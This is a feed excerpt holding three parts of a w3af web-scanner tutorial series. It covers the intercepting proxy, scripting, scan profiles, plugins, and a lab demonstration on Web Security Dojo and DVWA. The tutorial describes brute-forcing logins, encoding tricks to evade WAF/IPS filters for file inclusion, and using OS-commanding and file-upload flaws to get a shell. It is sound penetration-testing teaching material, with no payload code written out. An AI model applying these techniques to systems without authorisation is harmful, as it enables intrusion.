&lt;p&gt;&lt;strong&gt;4)Export Requests -&lt;/strong&gt; The Export Requests tools allows us to generate code in different languages which when run will regenerate the request. In the figure below, i am generating some code in Python, which when run will regenerate the original request. The Export Requests tool allow you to generate code in HTML, Ajax, Python and Ruby.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5)Compare -&lt;/strong&gt; The Compare tool is used to perform comparison between 2 requests/responses. As shown in the figure below, i have sent the comparer tool 2 responses for 2 different requests. The difference between these responses is highlighted by the comparer tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6)Proxy -&lt;/strong&gt; w3af also comes with an intercepting proxy that allow us to intercept requests, and modify them on the fly. To use this proxy, we have to configure our browser to use this proxy. In case of real world web application testing, it is important that we intercept only those requests that we want. The figure below shows the configuration for the proxy. We can see that it is running on port 8080. We have also configured the proxy to not trap requests for certain images, css, swf files etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s configure our browse to route traffic through this proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, start browsing through your browser. You will see the requests and the responses appearing in the History tab as shown in the figure below. Right now the requests and responses are being passed through the proxy without interception.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As discussed before in this article, you can send the requests/responses to the other tools like Manual Request editor, Fuzzy Request editor etc present in w3af. Click on the arrow pointing downwards on the top left to start intercepting the requests. If you browse through the proxy now, you will notice that the requests are being intercepted by the proxy as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can simply Drop the request so that it doesn’t reach its destination, forward it as it was or modify the request and then forward it. For e.g in the intercepted request shown in the figure below, we can see that the search query was &lt;em&gt;w3af&lt;/em&gt;. We can easily change it to whatever search query we want it to be. Some of the other uses of w3af proxy could be finding out the parameter names through which the authentication credentials are sent in a login submission.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;w3af-scripting&quot;&gt;w3af scripting&lt;/h2&gt;

&lt;p&gt;Many times we have to perform scans on different websites with the same set of plugins and the same configurations. However, for every new scan (or every new profile), we have to select the plugins, configure the options each time. This process could be time consuming. w3af scripting makes this very easy for us. We can write our own w3af scripts to automate the task of selecting the plugins, and performing the scan on different websites. w3af scripts end with the extension “.w3af” . We write a set of w3af console commands in the file. Once the script is run, each w3af console command will get executed in each line in the same order as they were written in the file. This is just the same way we would be using the w3af console. If we want to perform the scan on a different website with the same set of plugins, we can just change the target in the script. One other thing about running w3af scripts is that you can add your own commands once the script has run and made its changes. For e.g if i want to perform a scan with the same set of plugins and options on different websites i can just write a script which sets the plugins and the configurations without setting the target. Once the script has run, we can enter the target ourselves and then run the scan.&lt;/p&gt;

&lt;p&gt;Let’s start by writing a simple script to demonstrate the use of w3af scripts. In the figure below, i am writing a script that sets some plugins for a vulnerability scan. As it is clear from the figure below, i am using the webSpider discovery plugin, the xss and sqli audit plugins and the getMails grep plugin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, we save the file as simple-config.w3af. To run the script we just have to use the command &lt;em&gt;”./w3af_console -s simple-config.w3af”&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the output in the figure below. Once this is done, we can simply set the target ourselves and start the scan. Hence, having prewritten w3af scripts for different kinds of scans can save us a lot of time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following figure below shows another example of a w3af script which when run enables some plugins and starts the scan against the specified target.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;w3af-profiles&quot;&gt;w3af profiles&lt;/h2&gt;

&lt;p&gt;A w3af profile can be defined as a profile with preconfigured plugins made for a specific scenario keeping the resources and time availability in mind. We can also create our own w3af profile. However, w3af offers some of its own set of profiles which we can use in our scan as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af4/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s discuss all these profiles in brief.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1)OWASP_TOP10&lt;/strong&gt;- This profile searches the target web application for the ten most common security vulnerabilities defined by OWASP.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2)audit_high_risk&lt;/strong&gt;- This profile searches the target web application for high risk vulnerabilities like OS commanding etc which can later be used to fully compromise the web application.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3)bruteforce&lt;/strong&gt;- This profile can be used to perfom a bruteforce attack on the web application.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4)fast_scan&lt;/strong&gt;- This profile is used to perform a fast scan of the target web application. It uses only the webSpider plugin for discovery as enabling a large number of discovery plugins can take a long time.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5)full_audit&lt;/strong&gt;- This profile performs a full audit of the web application. It has almost all the audit, bruteforce and grep plugins enabled. Like the fast_scan profile, this also uses the webSpider plugin for discovery.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6)full_audit_manual_disc&lt;/strong&gt; - This profile is very similar to the full_audit profile, except that it also uses the SpiderMan plugin to perform manual discovery on the target web application. The SpiderMan and the webSpider plugins communicate with each other to find as much information as possible about the web application.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7)sitemap&lt;/strong&gt;- This profiles uses different discovery plugins like robotsReader, yahooSiteExplorer etc to create a sitemap of the target application.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8)web_infrastructure&lt;/strong&gt;- This profiles uses some of the discovery plugins like fingerprint_os, hmap, serverHeader etc to fingerprint the web application.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article we looked at the various tools like Proxy, Manual Request editor etc that w3af has to offer to help us perform web application vulnerability assessment and penetration testing. We then looked at how we can write our own w3af scripts to help automate the task of web application testing. Finally, we then looked at all the different preconfigured profiles that w3af has to offer and discussed their applications in different scenarios.&lt;/p&gt;

&lt;p&gt;This article is the final article in the &lt;em&gt;“w3af walkthrough and tutorial”&lt;/em&gt; series. Please drop a comment if you liked this series or if you have any questions regarding this series.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;w3af User Guide&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&quot;&gt;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;w3af-Plugins and descriptions&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/plugin-descriptions.php&quot;&gt;http://w3af.sourceforge.net/plugin-descriptions.php&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>w3af walkthrough and tutorial part 3 - Remaining plugins</title>
   <link href="https://bitbrain.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-3-remaining-plugins.html"/>
   <updated>2013-06-13T20:27:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-3-remaining-plugins</id>
   <content type="html">&lt;p&gt;In the previous article &lt;a href=&quot;http://resources.infosecinstitute.com/w3af-tutorial-2/&quot;&gt;w3af walkthrough and tutorial part 2 - Discovery and Audit plugins&lt;/a&gt; we looked at the various discovery and audit plugins used by w3af to identify vulnerabilities in a web application. We also looked at how we can exploit these vulnerabilities by using the exploit plugins present in w3af. In this article, we will look at the remaining plugins present in w3af which are bruteforce, grep, mangle, output, auth and evasion plugins and look at their applications in web application penetration testing.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;We will still be using the same test environment which we used in part 2, which is the &lt;em&gt;“w3af test environment”&lt;/em&gt; present in Web Security Dojo. Web Security Dojo is a vulnerable VM which has some vulnerable web applications as well as the tools needed to break into these web applications. It has both the console and the GUI versions of w3af. You can get a copy of Web Security Dojo from &lt;a href=&quot;http://sourceforge.net/projects/websecuritydojo/files/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1)Brute force&lt;/strong&gt; - Brute force plugins can be used to brute force login forms as well as http-auth logins. Once the discovery plugin finds any form with form based input or an http-auth input it will automatically launch the brute force attack against it if the corresponding brute force plugin is enabled. However, brute force plugins can be run as a seperate plugin themselves and can be used to carry out targeted attacks against a particular url with login forms. Some of the important things to set while running the brute force plugins are the configuration parameters. Brute force attacks take a long time and hence it is important to configure the options to maximize the efficiency with the minimum time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/Screen Shot 2012-03-21 at 2.20.11 PM.png&quot; alt=&quot;Screen Shot 2012 03 21 At 2.20.11 PM&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is advisable that you use your own list of files for the list of usernames and passwords. However w3af has its own set of files containing usernames and passwords. Also be sure to take a look at some of the other options. The useProfiling options uses the list of passwords generated by the passwordProfiling plugin. The passwordProfiling plugin is one of the grep plugins which generates a list of possible passwords by reading the responses and counting the most common words. The profilingNumber option indicates the number of passwords from the result of the passwordProfiling plugin to use for the bruteforce attack. The useLeetPasswd option uses leet passwords also for the attack. An example of a Leet password would be l33t (for the password leet).One of the other good configurable parameter is the useMails option. This options uses the email addresses that w3af finds (maybe through the grep plugin) to be one of the inputs for the username field. For e.g if one of the usernames is example@infosecinstitute.com, then the username tried would be example. This is another example of how the interaction between the different plugins in w3af could make the job much more effective.&lt;/p&gt;

&lt;p&gt;In this case, we will be going ahead and carrying out a bruteforce attack on the login form as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s go ahead and give the url of the login form as a target to w3af. Also make sure that the formAuthBrute plugin is selected and configure the parameters according to your need. Once this is done, click on &lt;em&gt;start&lt;/em&gt; to launch the attack&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/w3af3/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can clearly see from the output, w3af found the username and password as admin/1234.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;However, this is not always the case with every brute force attack&lt;/em&gt;. w3af and many other tools gives false positives on brute force attacks. Different tools have different ways to determine whether an attack has been successful or not. Some of the tools look for particular strings like “successful” or “logged in” etc to determine whether the attack has been successful or not. While some tools look for the response codes to determine whether the response was successful or not. This often leads to false positives because some application return the HTTP Status Code 200 with successful as well as unsuccessful login requests. Some tools identify the status code 200 as a metric for successful authentication and hence return false positives. Application which have the minimal difference in response between a successful or an unsuccessful login are likely to give away false positives when a tool is run against them. For e.g when the application DVWA (Damm Vulnerable web application) is configured on Security Level “High”, it just returns the response with a different length value for a successful login than for an unsuccessful login as shown in the figure below. (test perfomed by using BurpSuite)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Even the response codes are same in this case for both successful or unsuccessful logins. Hence it is often not advisable to look at what the tool says about a successful attack. Rather we should look at the response for different scenarios and see how they differ from each other. We will discuss these things in more detail later in this series.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2)Grep&lt;/strong&gt;-The grep plugin is used to find interesting information in the requests and responses going through like email accounts, forms with file upload capabilities, hashes, credit card numbers, email addresses etc. You can set the type of information you want to look for by setting the appropriate plugin. Since the grep plugin only analyzes the request and response, it is important to have some kind of discovery plugin enabled for it to work. Otherwise grep plugins are of no use. The information obtained by the grep plugins can be used by other plugins, for e.g the information obtained by the passwordProfiling plugin is used by the bruteForce plugin.&lt;/p&gt;

&lt;p&gt;Let’s run a simple test for the grep plugin. From the test environment, we give a url to w3af which has a credit card number in it as shown in the figure below. From the grep plugins list, make sure that the &lt;em&gt;creditCards&lt;/em&gt; plugin is selected. Once this is done, click on &lt;em&gt;Start&lt;/em&gt; to start the scan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see from the figure below, w3af found the credit card number present in the page. Let’s discuss some of the most important grep plugins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/1 copy.png&quot; alt=&quot;1 Copy&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a)Code Disclosure- This plugins checks the page for code disclosure vulnerabilities. It does this by looking for the expressions and &amp;lt;%.*%&amp;gt; which could reveal server side code like php etc. The test result from the figure below shows a code disclosure vulnerability found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, it is important to check whether the result is a false positive or not. As recommended in the previous articles in this series, it is always good to analyze the requests and responses which actually lead to the identification of that particular vulnerability. As we can see from the figure below, there is indeed a code disclosure vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;b)DOM Based XSS-The DOM based XSS plugin helps find XSS vulnerabilities. This occurs when a user input is used to output the data in the DOM. As we can see from the code of the page below, it looks for a parameter name, and then outputs that value in the DOM. However, from the code we can see that the paramter value is not being validated. Hence this is vulnerable to DOM Based XSS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we select this plugin and run a test against it, we see that w3af is able to find the DOM based XSS vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Again, it is important to check the request and response for the corresponding vulnerability and figure out if it was a false positive or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;c)findComments- The findComments plugin is used to check the response for interesting comments. For e.g a string containing the word “password” would be tagged as interesting and would be reported.&lt;/p&gt;

&lt;p&gt;d)getMails-This is one of the most important grep plugins. It looks for email addresses in every page. This information could then be used by the brute force plugins. Collecting emails form an important part of the information gathering stage during a penetration test.&lt;/p&gt;

&lt;p&gt;e)fileUpload-This plugin checks every page for file upload capabilities so that it can be further checked for fileUpload vulnerabilities. The figure below shows the result of running the fileUpload plugin against a page which contains a file upload capability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3)Evasion&lt;/strong&gt;- Evasion plugins are used to modify requests in order to bypass any WAF or IPS etc. It does this by modifying requests in unique ways so that the signature is not detected by Intrusion Prevention Systems. I contacted &lt;em&gt;Andres Riancho&lt;/em&gt; (the original author of w3af), and he had this to say about Evasion plugins.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“In evasion plugins I would also recommend only enabling one at the time and only doing so if you really know what you’re doing as it may break the scan and make it unstable”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let’s see some of the Evasion plugins and see how they work.&lt;/p&gt;

&lt;p&gt;a)backSpaceBetweenDots - This plugin is used to bypass the filters for the character &lt;em&gt;”..”&lt;/em&gt;. It does this by adding a character after a dot (.) and then adding a backspace character (%08) after it. Hence he character after the dot and the backspace character cancel each other thereby leaving only &lt;em&gt;”..”&lt;/em&gt; . This plugin could be used while performing Local File Inclusion or Remote file Inclusion attacks.&lt;/p&gt;

&lt;p&gt;b)ShiftOutShiftInBetweenDots - This plugin works similar to the backSpaceBetweenDots plugin and is used to bypass filters for &lt;em&gt;”..”&lt;/em&gt;. It just uses shift-in (%0E) and shift-out (%0F) characters which cancel each other out.&lt;/p&gt;

&lt;p&gt;c)rndHexEncode - This plugin adds random hex encoding in the url thereby making it difficult for different WAF or IPS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4)Mangle&lt;/strong&gt; - This plugin is used to modify request and responses on the fly using regular expressions. There are 3 configurable parameters, Expressions, fixContentLen and priority. In the expression option, we specify the expression which determines the rules by which the request or response will be changed. The figure below from w3af gui shows 2 examples of using Stream editing expression.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/Screen Shot 2012-03-21 at 2.56.03 PM.png&quot; alt=&quot;Screen Shot 2012 03 21 At 2.56.03 PM&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure below, i have configured w3af to look for the expression Google in the response body and replace it with the string Poogle.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5)Output&lt;/strong&gt;-The output plugin helps us decide the format in which we want the output. w3af supports many formats like console, emailReport, html, xml, text etc. Again you can set various parameters here like the filename, verbosity etc. In the figure below, i have set &lt;em&gt;verbose&lt;/em&gt; to True in the htmlFile plugin as i want a very detailed report about the application that i am testing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6)Auth&lt;/strong&gt; -Last but not the least, the auth plugin is one of the most important plugins in w3af. It is present only in newer versions of w3af. Hence, it is important to keep updated with the latest versions of w3af as a lot of bug fixes and performance enhancements are done with each release. Their is only one plugin named generic in auth plugins list. The main use of auth plugin comes in when w3af hits a login form while crawling a web application. Being a good scanner, it should be able to submit the credentials automatically in order to continue looking for information. By using this plugin, we can specify a predefined username/password that w3af should enter itself whenever it hits a login form. We need to specify all the parameters for the generic plugin in order for it to work successfully.&lt;/p&gt;

&lt;p&gt;In the figure below i am setting options for w3af to successfully log in to DVWA (Damn vulnerable web application) which is located on the address http://127.0.0.1/dvwa&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af3/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at some of the plugins in w3af like bruteForce, Mangle, Grep, Evasion and Auth and looked at how they aid us in the process of Web Application Penetration Testing. In the fourth and final part of this series, we will look at the various tools in w3af like &lt;em&gt;Manual Request&lt;/em&gt; editor, &lt;em&gt;Encoder&lt;/em&gt;, &lt;em&gt;Decoder&lt;/em&gt;, &lt;em&gt;Mitm-Proxy&lt;/em&gt; etc. We will also look at a topic called &lt;em&gt;w3af scripting&lt;/em&gt; through which it is possible to write w3af scripts which can perform the scans for us.&lt;/p&gt;

&lt;p&gt;Please drop a comment if you liked the article or if there is something about w3af that you want to see in the upcoming article.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;w3af User Guide&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&quot;&gt;http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;w3af-Plugins and descriptions&lt;br /&gt;
&lt;a href=&quot;http://w3af.sourceforge.net/plugin-descriptions.php&quot;&gt;http://w3af.sourceforge.net/plugin-descriptions.php&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;w3af Walkthrough and Tutorial Part 1&lt;br /&gt;
&lt;a href=&quot;http://resources.infosecinstitute.com/w3af-tutorial/&quot;&gt;http://resources.infosecinstitute.com/w3af-tutorial/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>w3af walkthrough and tutorial part 2 - Discovery and Audit plugins</title>
   <link href="https://bitbrain.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-2-discovery-and-audit-plugins.html"/>
   <updated>2013-06-13T09:05:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-2-discovery-and-audit-plugins</id>
   <content type="html">&lt;p&gt;In the previous article &lt;a href=&quot;http://resources.infosecinstitute.com/w3af-tutorial/&quot;&gt;w3af walkthrough and tutorial Part 1&lt;/a&gt; we looked at how to use the w3af console. We also learnt about the different plugins in w3af and how they interact with each other to perform various tasks. In this article we will look at how to use the discovery and audit plugins in w3af to perform a vulnerability scan of the web applications and consequently exploit the vulnerabilities present. We will also look at the various techniques used by w3af to identify these vulnerabilities. In this article we will be working with the w3af GUI version.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;web-security-dojo&quot;&gt;Web Security Dojo&lt;/h2&gt;

&lt;p&gt;One of the first and foremost things while testing w3af is to have a test environment where we can test all the features of w3af. Web Security Dojo is a vulnerable VM which has some vulnerable web applications as well as the tools needed to break into these web applications. Among the vulnerable web applications is the “w3af Test Environment”. This is the environment used by w3af to perform unit tests. Web Security Dojo also has both w3af console and w3af gui installed on it by default. You can get a copy of Web Security Dojo from &lt;a href=&quot;http://sourceforge.net/projects/websecuritydojo/files/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once you have downloaded Web Security Dojo, go to Applications–&amp;gt;Targets–&amp;gt;w3af Test Environment. You will be greeted with a message as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that even though Web Security Dojo is very useful for performing w3af tests, i would always recommend to use Backtrack 5 for the same purpose. One of the major problems with Web Sec Dojo is that it may not have the latest version of w3af. For e.g in the version of Web Sec Dojo which i have, the auth plugin is not there. You can just copy the w3af test environment folder (present in /var/www/w3af) from Web Sec dojo to your Backtrack machine and you are all set and ready to go. Also, please keep your w3af updated as major bug fixes are done with every new revision.&lt;/p&gt;

&lt;h2 id=&quot;audit-plugins&quot;&gt;Audit Plugins&lt;/h2&gt;

&lt;p&gt;So Let’s go to the Audit section in the w3af test environment. As we can see, the page has different links categorized on the basis of the vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we go on the page &lt;em&gt;Cross Site Scripting&lt;/em&gt; we see that there are a number of url’s that are vulnerable to Cross Site Scripting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hence the next step is to give the url to w3af and scan it for XSS vulnerabilities. Open up w3af GUI. Once it is open, on the left hand side, we can see an option to choose from various profiles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can choose any profile from the list depending on our need, as well as the time availability. These profiles already has configurations to use some specific plugins for a particular task. For e.g if we if look the profile OWASP_TOP10, we will see that it uses several of the Audit, Grep and Discovery plugins to perform its tasks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the time being, we are going to use an &lt;em&gt;Empty profile&lt;/em&gt; as we just want to check a single url for an XSS vulnerability. Note that this is usually not the way in which we will use the w3af framework. In a real world environment, we will choose some specific discovery plugins to find different url’s to check for injections, auth plugins to automatically log in to forms and crawl ahead, grep plugins to look for interesting information in the response, and audit plugins to scan for vulnerabilities in the found injection points.&lt;/p&gt;

&lt;p&gt;Type in the url in the target field and choose the &lt;em&gt;xss&lt;/em&gt; plugin from the audit plugins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, click on &lt;em&gt;Start&lt;/em&gt;. This will start the scan on the given url. As we can see from the output, it found a XSS vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you are interested in knowing what actually happened, go to the &lt;em&gt;Results&lt;/em&gt; Tab. Click on &lt;em&gt;xss&lt;/em&gt; on the left side. On the right side, you can see a description of how the vulnerability was found. On the bottom right, you can also see the request and response which led to the identification of the vulnerability. It is a very good practice to look at the requests and responses sent through by w3af as this lets us know what’s going on under the hood.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/31.png&quot; alt=&quot;31&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So basically what happened was that w3af sent javascript strings to every parameter in the url, and then checked for those strings in the response. In case of stored XSS, w3af takes a note of the injected string and makes a request again to the url looking for that string. If it finds that string, then a stored XSS has been identified.&lt;/p&gt;

&lt;p&gt;Let’s now use an OS commanding vulnerability to obtain a shell on the system. From the OS commanding section in the w3af test environment, choose a url and give it as target to w3af. Under the audit plugins section, check the OS commanding plugin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, click on start to launch the vulnerability scan. As we can see from the output, w3af identified an OS commanding vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;w3af supports detection of both simple and blind OS commanding vulnerability. In simple OS commanding, it sends a simple command to every parameter and then looks for a response to that command in the output. In case of blind OS commanding in which the response is not present in the output, it uses time delays to identify if a vulnerability is present. For e.g if it sends a command which delays the response for some seconds, and if we note a delay in the output, we can say that a blind OS commanding vulnerability is present.&lt;/p&gt;

&lt;p&gt;Again, in the results section, we can see the request and the response which led to identification of the vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;w3af also allows us to exploit vulnerabilities. If we go under the &lt;em&gt;Exploit&lt;/em&gt; section, we can see the identified vulnerability in the &lt;em&gt;Vulnerabilities&lt;/em&gt; section. If we click on it, we can see that &lt;em&gt;osCommandignShell&lt;/em&gt; in the Exploits section turns black. This is an indication that the vulnerability can be exploited using the osCommandingShell plugin in w3af. Right click on osCommandingShell and click on &lt;em&gt;Exploit ALL vulns&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, if the vulnerability is exploited successfully, we will get a shell on the target machine. We can see the list of shells on the right side. Note that it is not possible to get a shell in case of every vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/w3af2/12.png&quot; alt=&quot;12&quot; /&gt; Just double click on the shell and you are all set and ready to go. &lt;img src=&quot;/images/posts/w3af2/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, let’s use a file upload vulnerability to get a shell. Give the vulnerable url as a target to w3af. Make sure, the &lt;em&gt;fileUpload&lt;/em&gt; plugin is checked in the audit plugins list.&lt;/p&gt;

